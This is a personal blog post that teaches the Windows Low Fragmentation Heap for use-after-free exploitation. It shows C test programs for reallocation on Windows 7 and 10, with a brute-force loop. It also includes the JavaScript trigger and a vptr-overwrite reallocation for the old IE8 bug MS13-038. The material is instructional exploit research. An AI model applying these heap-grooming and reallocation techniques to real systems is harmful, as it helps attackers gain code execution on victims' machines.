[Home](https://plackyhacker.github.io)

# Low Fragmentation Heap

It's a new year (2025) and I am still studying Use-after-free (UaF) bugs and the Low Fragmentation Heap. When I was preparing for the Advanced Windows Exploitation course I could not find a great deal of **basic** material explaining the heap in Windows. So... here are some basics!

## Introduction to the Windows Heap

We've all heard of the stack and the heap right? The stack is a memory region used to store local variables and function call data, such as the saved return address. The variables stored on the stack are known at compile-time; the size of them, their usage, location etc. This is very useful, but it does not cater for variables and memory allocations that are dynamic and required at runtime. Memory is allocated and freed dynamically at runtime in a memory region referred to as the heap.

In Windows, the heap manager is a software layer that resides on top of the virtual memory interfaces provided by the Windows kernel. This allows applications running in Windows to dynamically allocate and release memory via the Windows APIs such as `HeapAlloc` and `HeapFree`.

If you have written code in `C` or `C++`, you may have used functions such as `malloc` and `free` or keywords (in `C++`) such as `new` and `delete` to allocate and free virtual memory. In Windows these are higher-level abstractions that ultimately rely on the Windows APIs (depending upon how the runtime implements memory allocations).

Windows 10 introduced something called the segment heap but I'm not going to write about that, not today anyway!

### Front End Allocator

The front end allocator is used to serve small allocation requests and is built to optimise performance. 

The Low Fragmentation Heap (LFH) was introduced in Windows XP and minimises fragmentation by organising memory into fixed-size blocks and efficiently reusing them. These replaced lookaside lists which were much simpler, and stored freed memory blocks for quick reuse but they lacked the fragmentation management features of LFH.

### Back End Allocator

The back end allocator serves memory allocations when the front end allocator cannot; such as an exhaustion of chunks in the front end, the size of the request, or that LFH is not active.

## What is the LFH?

The LFH organises allocations into chunks, that are stored in buckets:

- **LFH Buckets**: The LFH organises memory allocations into predefined buckets, each corresponding to a specific allocation size.
- **Allocation Sizes**: Each bucket manages allocations of a particular size.
- **Granularity**: The granularity refers to the size increments between buckets.

This is important information when studying UaF bugs. If a specific memory region/address has been freed and we want to reallocate our 'specially crafted, evil buffer' at the same memory location then we need to know the size of the allocation. If we try to allocate a different size it will land in a different bucket.

The LFH isn't enabled by default, this generally isn't a concern as the application we are targetting has most likely already enabled it. It is a concern if we are studying it! It's quite simple: 18 consecutive allocations in the same bucket, on the same heap will enable the LFH:

```c
for(int i = 0; i < 18; i++)
{
  char *alloc = (char *)HeapAlloc(GetProcessHeap(), 0, 0xb0); 
}
```

Understanding how the heap allocates memory is a good thing... for exploit developers. If you can manipulate the heap, you may be able to corrupt memory structures or pointers, such as shown [here](https://plackyhacker.github.io/classes/use-after-free). Depending on the target heap you may simply have to reallocate some memory of a similar size to that freed, 'groom' a heap to overwrite things you shouldn't, or brute force allocations. Here I am going to write a couple of small `C` programs to see how we can overwrite a freed memory address in a UaF scenario.

The UaF bug is very trivial, but serves as an easy example:

```c
int main(int argc, char *argv[])
{
  // enable the LFH
  for(int i = 0; i < 18; i++)
  {
    char *alloc = (char *)HeapAlloc(GetProcessHeap(), 0, 0xb0);
  }

  // allocate a chunk on the LFH and set it to all A characters
  char *alloc1 = (char *)HeapAlloc(GetProcessHeap(), 0, 0xb0); 
  memset(alloc1, 0x41, 0xaf);

  // print the memory location and the string
  printf("Allocation 1 0x%p\n", alloc1);
  printf("Allocation 1 string: %s\n\n", alloc1);

  // free the allocation
  printf("Freeing allocation 1\n\n");
  HeapFree(GetProcessHeap(), 0, alloc1);

  // this is a trivial Uaf bug
  printf("Allocation 1 string: %s\n\n", alloc1);
}
```

The code is trying to print the string from the freed memory, this prints random data (as the memory allocation has been freed):

<img width="1110" alt="Screenshot 2025-01-16 at 08 39 41" src="https://github.com/user-attachments/assets/e6fdc0d5-44ea-451b-bdff-6d7d0d8306f4" style="border: 1px solid black;"/>

Yes this is trivial, in a real-world example this might crash if it is dereferencing a function pointer (such as **vptr**) and present us with a code execution opportunity. I am looking to see if I can reallocate to the freed memory address, and if the technique differs between Windows 7 and Windows 10.

## Windows 7 Allocation

To test how we might be able to reallocate to freed memory I added the following code to my test code:

```c
  HeapFree(GetProcessHeap(), 0, alloc1);

  // changes ----------------------------------------------------------
  char *alloc2 = (char *)HeapAlloc(GetProcessHeap(), 0, 0xb0); 
  printf("Allocation 2 0x%p\n", alloc2);
  printf("Allocation 2 string: %s\n\n", alloc2);
  // ------------------------------------------------------------------

  printf("Allocation 1 string: %s\n\n", alloc1);
```

Notice that I have 'asked' the heap manager to allocate some memory the same size as the freed memory. Will it have the same address? Is it that predictable?

<img width="731" alt="Screenshot 2025-01-16 at 11 41 11" src="https://github.com/user-attachments/assets/85f4c6ef-c212-4066-97ce-b6b3d81659a7" style="border: 1px solid black;" />

It turns out it is! Windows 7 allocates memory from the last chunk that was released in the associated bucket. This is fast, but it is also very predictable. In the real-world example I show later we will see why this is a problem.

Let's try the same experiment on Windows 10.

## Windows 10 Allocation

Running the exact same code on Windows 10 produces a different result:

<img width="723" alt="Screenshot 2025-01-16 at 11 43 36" src="https://github.com/user-attachments/assets/39497016-057b-420a-95fd-c6cbf6ea6bdd" style="border: 1px solid black;" />

Notice that the application doesn't finish execution but also that the allocations are not at the same address. And strangely there is some unexpected behaviour; for example it doesn't print the "Freeing allocation 1" string! The important part is that the memory allocation is no longer predictable.

It turns out that from Windows 8 onwards the heap manager randomises LFH allocations. What does this mean for exploit developers. It means we need to brute-force the allocation:

```c
  HeapFree(GetProcessHeap(), 0, alloc1);

  // changes ----------------------------------------------------------
  printf("Brute force...\n\n");
  for(int i = 0; i < 0x100; i++)
  {
    char *alloc2 = (char *)HeapAlloc(GetProcessHeap(), 0, 0xb0); 
    memset(alloc2, 0x42, 0xaf);
  }
  // ------------------------------------------------------------------

  printf("Allocation 1 string: %s\n\n", alloc1);
```

When we run this code we once again allocate to the memory that was freed, we can see this when we print `alloc1` but it displays the string we brute forced:

<img width="721" alt="Screenshot 2025-01-16 at 11 49 10" src="https://github.com/user-attachments/assets/1a9ae2a0-b666-442f-a4f7-a2ec4668cf45" style="border: 1px solid black;" />

Let's take a look at a real world example.

## A Real-world Example in IE8

On 14/05/2013 Microsoft issued a security bulletin for [MS13-038](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2013/ms13-038). The ‘vulnerability could allow remote code execution if a user views a specially crafted webpage using Internet Explorer’. Yes, this is a very old bug, but it demonstrates UaF without any complex mitigations that Microsoft have implemented since.

Here is the `javascript` code that triggered the UaF (this was taken directly from the Off by One Security Browser [Exploitation Introduction live stream](https://www.youtube.com/watch?v=bcnV1dbfKcE) by Stephen Sims):

```javascript
<script>
// the bug trigger code
f0 = document.createElement('span');
document.body.appendChild(f0);
f1 = document.createElement('span');
document.body.appendChild(f1);
f2 = document.createElement('span');
document.body.appendChild(f2);
document.body.contentEditable = "true";
f2.appendChild(document.createElement('datalist'));
f1.appendChild(document.createElement('span'));
f1.appendChild(document.createElement('table'));
try {
  f0.offsetParent = null;
} catch (e) { 
  f2.innerHTML = "";
  f0.appendChild(document.createElement('hr'));
  f1.innerHTML = "";
  CollectGarbage();
</script>
```

To understand it more I recommend watching the video. Anyway, it turns out that this bug frees an allocation of `0x38` bytes and the freed memory once contained a `vptr` to a `vftable`. The browser crashes when it tries to dereference the `vptr`. If we can reallocate that pointer we can point it to anywhere in memory and get code execution by creating a fake `vftable`.

We now know that Windows 7 has a very predictable LFH memory allocation method, so we can use the following code to reallocate in the exact same memory that was freed:

```javascript
// reallocate
var vptr = "\u1337\u1337AAAAAAAAAAAAAAAAAAAAAAAAA";
var div1 = new Array();
div1.push(document.createElement('div'));
div1[0].className = vptr;
```

When we run the PoC when attached to WinDbg we can see that the pointer has been dereferenced and the browser is now trying to dereference a function in a `vftable` that does not exist. The important part to note is that because the heap allocation is predictable we can control that dereferenced address:

<img width="1445" alt="Screenshot 2025-01-16 at 12 23 25" src="https://github.com/user-attachments/assets/fc1a08a0-0a6b-4151-9e6a-c20bc4882168" style="border: 1px solid black;" />

If the UaF existed in an application running on Windows 8 and above this type of reallocation would fail and some sort of brute-forcing or 'grooming' would be required.

## Final Thoughts

I find it always helps when studying things to solidify my understanding by testing the basics. Hopfully this has been helpful to at least one other person on planet earth.

That's all folks!

[Home](https://plackyhacker.github.io)
